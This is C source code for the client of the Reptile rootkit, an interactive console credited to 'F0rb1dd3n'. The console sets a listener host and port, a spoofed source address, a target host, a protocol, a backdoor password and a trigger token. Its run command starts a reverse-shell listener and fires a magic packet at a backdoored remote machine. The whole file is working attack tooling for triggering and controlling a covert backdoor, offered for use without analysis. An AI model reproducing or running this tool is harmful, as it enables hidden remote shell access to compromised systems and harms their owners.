#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#include "config.h"
#include "util.h"

pid_t pid;

char *var_str[] = {"lhost", "lport", "srchost", "srcport", "rhost",
		   "rport", "prot",  "pass",    "token"};
char *var_str_up[] = {"LHOST", "LPORT", "SRCHOST", "SRCPORT", "RHOST",
		      "RPORT", "PROT",  "PASS",    "TOKEN"};

char *description[] = {"Local host to receive the shell",
		       "Local port to receive the shell",
		       "Source host on magic packets (spoof)",
		       "Source port on magic packets (only for TCP/UDP)",
		       "Remote host",
		       "Remote port (only for TCP/UDP)",
		       "Protocol to send magic packet (ICMP/TCP/UDP)",
		       "Backdoor password (optional)",
		       "Token to trigger the shell"};

int num_variables = 9; //() { return sizeof(var_str) / sizeof(char *); }
char *var_array[] = {NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL};

int help(char **args);
int __exit(char **args);
int set(char **args);
int unset(char **args);
int show(char **args);
int run(char **args);

char *builtin_str[] = {"help", "set", "unset", "show", "run", "exit"};
int (*builtin_func[])(char **) = {&help, &set, &unset, &show, &run, &__exit};

int num_builtins() { return sizeof(builtin_str) / sizeof(char *); }

int launch(char **args)
{
	pid_t pid;
	int status;

	pid = fork();
	if (pid == 0) {
		if (execvp(args[0], args) == -1) {
			perror("execvp");
		}
		exit(EXIT_FAILURE);
	} else if (pid < 0) {
		perror("fork");
	} else {
		do {
			waitpid(pid, &status, WUNTRACED);
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	}

	return 1;
}

int help(char **args)
{
	if (args[0] == NULL)
		return 1;

	if (args[1] != NULL) {
		if (strcmp(args[1], builtin_str[1]) == 0) {
			fprintf(stdout, "%s <variable> <value>\n",
				builtin_str[1]);
			fprintf(stdout, "Example: set LHOST 192.168.0.2\n");
		} else if (strcmp(args[1], builtin_str[2]) == 0) {
			fprintf(stdout, "%s <variable>\n", builtin_str[2]);
			fprintf(stdout, "Example: unset RHOST\n");
		} else {
			if (strcmp(args[1], builtin_str[0]) == 0 ||
			    strcmp(args[1], builtin_str[3]) == 0 ||
			    strcmp(args[1], builtin_str[4]) == 0 ||
			    strcmp(args[1], builtin_str[5]) == 0) {
				fprintf(stdout,
					"This command doesn't need help\n");
			} else {
				fprintf(stdout, "This command is not valid!\n");
			}
		}
	} else {
		fprintf(stdout, "\n\e[01;36mReptile Client\e[00m\n");

		fprintf(stdout, "\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");
		fprintf(stdout, "\t%s\t\tShow this help\n", builtin_str[0]);
		fprintf(stdout, "\t%s\t\tSet value to a variable\n",
			builtin_str[1]);
		fprintf(stdout, "\t%s\t\tUnset value to a variable\n",
			builtin_str[2]);
		fprintf(stdout, "\t%s\t\tShow the current configuration\n",
			builtin_str[3]);
		fprintf(stdout,
			"\t%s\t\tRun the listener and send the magic packet\n",
			builtin_str[4]);
		fprintf(stdout, "\t%s\t\tExit this shell\n\n", builtin_str[5]);
		fprintf(stdout,
			"Type: \"help <command>\" to see specific help\n");
	}

	fprintf(stdout, "\n");
	return 1;
}

int __exit(char **args)
{
	int i;

	if (args[0] == NULL)
		return 1;

	for (i = 0; i < num_variables; i++) {
		if (var_array[i])
			free(var_array[i]);

		var_array[i] = NULL;
	}

	fprintf(stdout, "\n");
	return 0;
}

int set(char **args)
{
	int i;

	if (args[0] == NULL)
		return 1;

	if (args[1] == NULL || args[2] == NULL) {
		fprintf(stdout, "%s wrong syntax!\n", bad);
		return 1;
	}

	for (i = 0; i < num_variables; i++) {
		if (strcmp(args[1], var_str[i]) == 0 ||
		    strcmp(args[1], var_str_up[i]) == 0) {
			if (var_array[i])
				free(var_array[i]);

			var_array[i] = strdup(args[2]);
			fprintf(stdout, "%s %s -> %s\n", good, args[1],
				args[2]);
			return 1;
		}
	}

	fprintf(stdout, "%s wrong parameter!\n", bad);
	return 1;
}

int unset(char **args)
{
	int i;

	if (args[0] == NULL)
		return 1;

	if (args[1] == NULL) {
		fprintf(stdout, "%s wrong syntax!\n", bad);
		return 1;
	}

	for (i = 0; i < num_variables; i++) {
		if (strcmp(args[1], var_str[i]) == 0 ||
		    strcmp(args[1], var_str_up[i]) == 0) {
			if (var_array[i])
				free(var_array[i]);

			var_array[i] = NULL;
			fprintf(stdout, "%s %s -> UNSET\n", good, args[1]);
			return 1;
		}
	}

	fprintf(stdout, "%s wrong parameter!\n", bad);
	return 1;
}

int show(char **args)
{
	int i;

	if (args[0] == NULL)
		return 1;

	fprintf(stdout, "\n");
	fprintf(stdout, "\e[00;33mVAR\t\tVALUE\t\t\tDESCRIPTION\e[00m\n\n");

	for (i = 0; i < num_variables; i++) {
		if (var_array[i]) {
			if (strlen(var_array[i]) >= 8) {
				fprintf(stdout, "%s\t\t%s\t\t%s\n",
					var_str_up[i], var_array[i],
					description[i]);
			} else if (strlen(var_array[i]) >= 16) {
				fprintf(stdout, "%s\t\t%s\t%s\n", var_str_up[i],
					var_array[i], description[i]);
			} else {
				fprintf(stdout, "%s\t\t%s\t\t\t%s\n",
					var_str_up[i], var_array[i],
					description[i]);
			}
		} else {
			fprintf(stdout, "%s\t\t      \t\t\t%s\n", var_str_up[i],
				description[i]);
		}
	}

	fprintf(stdout, "\n");
	return 1;
}

int run(char **args)
{
	pid_t pid, pid2;
	int status, len;
	char *listener, *packet;
	char *envp[1] = {NULL};
	char *pwd = get_current_dir_name();

	if (args[0] == NULL)
		return 1;

	if (!var_array[0]) {
		fprintf(stdout, "%s %s is not defined!\n", bad, var_str_up[0]);
		return 1;
	}

	if (!var_array[1]) {
		fprintf(stdout, "%s %s is not defined!\n", bad, var_str_up[1]);
		return 1;
	}

	if (!var_array[2]) {
		fprintf(stdout, "%s %s is not defined!\n", bad, var_str_up[2]);
		return 1;
	}

	if (!var_array[4]) {
		fprintf(stdout, "%s %s is not defined!\n", bad, var_str_up[4]);
		return 1;
	}

	if (!var_array[6]) {
		fprintf(stdout, "%s %s is not defined!\n", bad, var_str_up[6]);
		return 1;
	}

	if (!var_array[8]) {
		fprintf(stdout, "%s %s is not defined!\n", bad, var_str_up[8]);
		return 1;
	}

	if (!(strcmp(var_array[6], "icmp") == 0 ||
	    strcmp(var_array[6], "ICMP") == 0)) {
		if (!var_array[3]) {
			fprintf(stdout, "%s %s is not defined!\n", bad,
				var_str_up[3]);
			return 1;
		}

		if (!var_array[5]) {
			fprintf(stdout, "%s %s is not defined!\n", bad,
				var_str_up[5]);
			return 1;
		}
	}

	len = strlen(pwd);

	listener = (char *)malloc(len + 9);

	if (!listener)
		fatal("malloc");

	packet = (char *)malloc(len + 7);

	if (!packet) {
		free(listener);
		fatal("malloc");
	}

	bzero(listener, len + 9);
	bzero(packet, len + 7);

	strcpy(listener, pwd);
	strcat(listener, "/listener");

	strcpy(packet, pwd);
	strcat(packet, "/packet");

	char *arg_listener[] = {listener,     "-p", var_array[1], "-s",
				var_array[7], NULL, NULL};

	char *arg_packet[] = {packet,       "-t", var_array[4], "-x",
			      var_array[6], "-s", var_array[2], "-l",
			      var_array[0], "-p", var_array[1], "-k",
			      var_array[8], "-q", var_array[3], "-r",
			      var_array[5], NULL, NULL};

	pid = fork();

	if (pid == -1)
		fatal("on forking proccess");

	if (pid > 0) {
		do {
			waitpid(pid, &status, WUNTRACED);
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));

		free(listener);
		free(packet);
	}

	if (pid == 0) {
		pid2 = fork();

		if (pid2 == -1)
			fatal("on forking proccess");

		if (pid2 > 0) {
			if (var_array[7] == NULL) {
				arg_listener[3] = NULL;
				arg_listener[4] = NULL;
			}
			execve(arg_listener[0], arg_listener, envp);
			exit(1);
		}

		if (pid2 == 0) {
			if (strcmp(var_array[6], "icmp") == 0 ||
			    strcmp(var_array[6], "ICMP") == 0) {
				arg_packet[13] = NULL;
				arg_packet[14] = NULL;
				arg_packet[15] = NULL;
				arg_packet[16] = NULL;
			}
			usleep(100 * 1500);
			execve(arg_packet[0], arg_packet, envp);
			exit(1);
		}
	}
	return 1;
}

int execute(char **args)
{
	int i;

	if (args[0] == NULL)
		return 1;

	for (i = 0; i < num_builtins(); i++) {
		if (strcmp(args[0], builtin_str[i]) == 0)
			return (*builtin_func[i])(args);
	}

	return launch(args);
}

char *read_line(void)
{
	int bufsize = RL_BUFSIZE;
	int position = 0;
	char *buffer = malloc(sizeof(char) * bufsize);
	int c;

	if (!buffer) {
		fprintf(stderr, "reptile: allocation error\n");
		exit(EXIT_FAILURE);
	}

	while (1) {
		c = getchar();

		if (c == EOF) {
			free(buffer);
			exit(EXIT_SUCCESS);
		} else if (c == '\n') {
			buffer[position] = '\0';
			return buffer;
		} else {
			buffer[position] = c;
		}
		position++;

		if (position >= bufsize) {
			bufsize += RL_BUFSIZE;
			buffer = realloc(buffer, bufsize);
			if (!buffer) {
				fprintf(stderr, "reptile: allocation error\n");
				exit(EXIT_FAILURE);
			}
		}
	}
}

char **parse(char *line)
{
	int bufsize = TOK_BUFSIZE, position = 0;
	char **tokens = malloc(bufsize * sizeof(char *));
	char *token, **tokens_backup;

	if (!tokens) {
		fprintf(stderr, "reptile: allocation error\n");
		exit(EXIT_FAILURE);
	}

	token = strtok(line, TOK_DELIM);
	while (token != NULL) {
		tokens[position] = token;
		position++;

		if (position >= bufsize) {
			bufsize += TOK_BUFSIZE;
			tokens_backup = tokens;
			tokens = realloc(tokens, bufsize * sizeof(char *));
			if (!tokens) {
				free(tokens_backup);
				fprintf(stderr, "reptile: allocation error\n");
				exit(EXIT_FAILURE);
			}
		}

		token = strtok(NULL, TOK_DELIM);
	}
	tokens[position] = NULL;
	return tokens;
}

void client_loop()
{
	char *line;
	char **args;
	int status;

	do {
		fprintf(stdout, "\e[00;31mreptile-client> \e[00m");
		line = read_line();
		args = parse(line);
		status = execute(args);

		free(line);
		free(args);
	} while (status);
}

int main()
{
	char lport[] = "4444";
	char srcport[] = "666";
	char token[] = "hax0r";

	system("clear");
	printf("\n\e[01;36mReptile Client\e[00m\n");
	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n");
	banner2();
	printf("\n");

	var_array[1] = strdup(lport);
	var_array[3] = strdup(srcport);
	var_array[8] = strdup(token);

	pid = fork();

	if (pid == -1)
		fatal("on forking proccess");

	if (pid > 0)
		client_loop();

	// if (pid == 0)
	// background job

	return EXIT_SUCCESS;
}
